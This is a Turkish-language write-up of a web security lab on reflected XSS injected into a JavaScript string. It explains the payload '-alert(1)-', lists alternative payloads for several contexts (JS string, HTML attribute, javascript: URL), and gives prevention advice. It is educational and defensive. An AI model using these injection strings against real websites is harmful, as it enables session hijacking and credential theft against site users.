# Reflected XSS into a JavaScript string with angle brackets HTML encoded

## Lab Açıklaması
Bu laboratuvarda, JavaScript string'ine enjekte edilen Reflected XSS zafiyetini inceliyoruz. Açı parantezler (`<`, `>`) HTML-encoded olmasına rağmen, string içindeki operatörler manipüle edilerek JavaScript kodu çalıştırılır.

---

## Analiz

### Uygulama Davranışı
- Sitede bir arama (search) fonksiyonu bulunmaktadır.
- Arama terimi bir JavaScript değişkenine atanır.
- Bu değişken daha sonra encodeURIComponent fonksiyonuyla encode edilerek kullanılır.

### Kaynak Kod İncelemesi
```javascript
var searchTerms = 'TESTEST';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

### Zafiyet Noktası
- Kullanıcı girdisi doğrudan JavaScript string'ine yazılıyor.
- Açı parantezler HTML-encoded olsa da, **string bağlamındaki (context) kaçış karakterlerini kötüye kullanabiliriz**.
- `encodeURIComponent()` fonksiyonu URL parametresi için encode ediyor, ancak **string tanımlamasından çıkmayı engellemiyor**.
- Değişken atama işlemi `=` işleci ile kontrol altına alınabilir.

---

## İstismar

### Saldırı Stratejisi
1. String tanımını kapatıp ayrı bir ifade (expression) oluştur.
2. Matematiksel operatörler (`-`, `+` vb.) kullanarak syntax oluştur.
3. Operatör tarafından evaluate edilmesi gereken fonksiyon çalıştır.
4. Syntax hatasını engel (ek string ile).

### Payload

```
'-alert(1)-'
```

#### Payload Çalışma Mekanizması

**Orijinal Kod:**
```javascript
var searchTerms = 'TESTEST';
```

**Saldırgan Payload'ı Yazınca:**
```javascript
var searchTerms = ''-alert(1)-'';
```

**JavaScript Motoru (V8) İşleme:**
```javascript
var searchTerms = '' - alert(1) - '';
```

**Adım Adım Yürütme:**
1. `''` (Boş string) → `0` (number'a dönüştürülür)
2. `-` (Çıkartma operatörü) çalıştırılmaya hazırlanır
3. `alert(1)` → **Operatör'ün sağ tarafı için bu fonksiyon çalıştırılmak zorundadır!**
4. Fonksiyon sonucu number'a dönüştürülmeye çalışılır
5. `- ''` → Bir çıkartma işlemi daha yapılır
6. Sonuç: `NaN` (Not a Number) döner, **ancak `alert(1)` zaten çalıştırıldı!**

#### Sonuç Kod
```javascript
var searchTerms = NaN; // Değişken NaN'e atanır
// Ama alert(1) popup'ı zaten görüntülendi!
```

### Neden Çalışır?
- JavaScript'te `+` ve `-` operatörleri her iki tarafını **evaluate etmek zorundadır**.
- `alert(1)` bir fonksiyon çağrısıdır ve **side effect** oluşturur (popup gösterir).
- Operatör'ün return değeri (`undefined`) number'a dönüştürülür (`NaN`).
- **String kaçışı başarılı olur** ve JavaScript koşulsuz olarak çalışır.

### Alternatif Payload'lar

```javascript
// Diğer matematiksel operatörler
'-alert(1);var dummy='-'
';alert(1);//'
'+alert(1)+'
'*alert(1)*'
'/alert(1)/'
```

### Saldırı Adımları
1. Arama kutusuna payload'ı yaz: `'-alert(1)-'`
2. Search butonuna tıkla.
3. Sayfa yüklenir ve JavaScript evaluate edilir.
4. `alert(1)` otomatik olarak çalışır ve **pop-up** görüntülenir.

---

## Sonuç

✅ **Lab Başarıyla Tamamlandı**

Payload başarıyla çalışır ve **alert popup** görüntülenir. Bu, JavaScript string bağlamında operatör manipulation'ı kullanarak XSS saldırısının gerçekleştirilebileceğini gösterir.

---

## Zafiyet Özeti

| Unsur | Değer |
|-------|-------|
| **Zafiyet Türü** | Reflected XSS (JavaScript Context) |
| **Kaynak (Source)** | URL query parameter (`search`) |
| **Sink** | JavaScript `var` değişken ataması |
| **Kaçış Yöntemi** | String tırnak işareti (`'`) + operatör manipulation |
| **Kullanılan Operatör** | `-` (Çıkartma) |
| **Payload** | `'-alert(1)-'` |
| **Tetikleme Yolu** | JavaScript evaluate sırasında otomatik |

---

## JavaScript Context Zafiyetleri

### Farklı Context'ler ve Kaçış Yöntemleri

#### 1. HTML Context (HTML body içinde)
```html
<!-- ❌ Zafiyetli -->
<p>TESTEST</p>

<!-- ✅ Payload -->
<img src=x onerror=alert(1)>
```

#### 2. HTML Attribute Context
```html
<!-- ❌ Zafiyetli -->
<input value="TESTEST">

<!-- ✅ Payload -->
" onmouseover="alert(1)" a="
```

#### 3. JavaScript String Context (Bu Lab)
```javascript
// ❌ Zafiyetli
var searchTerms = 'TESTEST';

// ✅ Payload
'-alert(1)-'
```

#### 4. JavaScript Expression Context
```javascript
// ❌ Zafiyetli
var x = TESTEST;

// ✅ Payload
1;alert(1)//
```

#### 5. URL Context
```html
<!-- ❌ Zafiyetli -->
<a href="TESTEST">Link</a>

<!-- ✅ Payload -->
javascript:alert(1)
```

---

## Önleme Önerileri

### 1. Context'e Uygun Encoding Kullanma
```javascript
// ❌ Yeterli değil - sadece URL encode ediyor
var searchTerms = encodeURIComponent(userInput);

// ✅ JavaScript string'i için escape et
function escapeJSString(str) {
    return str.replace(/[\\'"]/g, '\\$&')
              .replace(/\n/g, '\\n')
              .replace(/\r/g, '\\r')
              .replace(/\t/g, '\\t');
}
var searchTerms = escapeJSString(userInput);
```

### 2. Template Literal'lar İçin Daha İyi Çözüm
```javascript
// ❌ Riskli
const searchTerms = `${userInput}`;

// ✅ Safer - DOM API kullan
const searchContainer = document.getElementById('search-results');
searchContainer.textContent = userInput; // HTML olarak parse edilmez
```

### 3. JSON String'i Olarak Encode Etme
```javascript
// JSON encode tüm gerekli karakterleri escape eder
const searchTerms = JSON.stringify(userInput);
```

### 4. DOM API Kullanma (En Güvenli)
```javascript
// ❌ Riskli - HTML olarak parse edilir
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');

// ✅ Güvenli - DOM API kullan
const img = document.createElement('img');
img.src = '/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(userInput);
document.body.appendChild(img);
```

### 5. Content Security Policy (CSP)
```html
<!-- Inline script'leri engelle -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; default-src 'self'">
```

### 6. Template Engine Kullanma
```javascript
// EJS, Handlebars, Nunjucks gibi template engine'ler
// context'e göre otomatik escaping yapar

// Handlebars örneği
const template = Handlebars.compile('Search: {{searchTerm}}');
const result = template({ searchTerm: userInput }); // Otomatik escape
```

### 7. Security Header'ları Eklemek
```javascript
// Node.js / Express örneği
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Content-Security-Policy', "script-src 'self'");
    next();
});
```

### 8. Input Validasyonu
```javascript
// Arama input'unu sınırla
function validateSearchTerm(input) {
    // Sadece alfanumerik ve boşluk izin ver
    if (!/^[a-zA-Z0-9\s]*$/.test(input)) {
        return '';
    }
    return input.substring(0, 100); // Maksimum uzunluk
}
```

---

## JavaScript String Escape Karakterleri

```javascript
// Kaçış gereken karakterler
const escapeChars = {
    '\'': '\\\'',  // Tek tırnak
    '"': '\\"',    // Çift tırnak
    '\\': '\\\\',  // Ters slash
    '\n': '\\n',   // Yeni satır
    '\r': '\\r',   // Carriage return
    '\t': '\\t',   // Tab
    '\b': '\\b',   // Backspace
    '\f': '\\f',   // Form feed
    '\v': '\\v'    // Vertical tab
};

function escapeJSString(str) {
    return str.split('').map(char => escapeChars[char] || char).join('');
}
```

---

## Genel Güvenlik Önerileri

1. **Context Farkında Olun**: HTML, Attribute, JavaScript, URL context'leri farklı encoding gerektirir.
2. **Operatör Manipulation'ı Bilin**: Matematiksel operatörler side effect'leri tetikleyebilir.
3. **DOM API Tercih Et**: `document.write()` yerine `appendChild()` gibi safer API'ler kullan.
4. **Template Engine Kullan**: Otomatik escaping yapan template engine'ler tercih et.
5. **Input Validasyonu**: Sadece gerekli karakterlere izin ver.
6. **Content Security Policy**: CSP header'ları ekle.
7. **Escape Fonksiyonları Kontrol Et**: Her context için doğru escape fonksiyonunu kullan.
8. **Server-side Validation**: Client-side validation'a güvenme.

---

## Impact

**Orta-Yüksek Risk** 🟡
- Sadece XSS payload'ını tıklayan ziyaretçiler etkilenir (Reflected XSS).
- Ancak JavaScript context'indeki escape işlemi zayıfsa, saldırganın esnekliği artar.
- Session hijacking, credential theft mümkün.
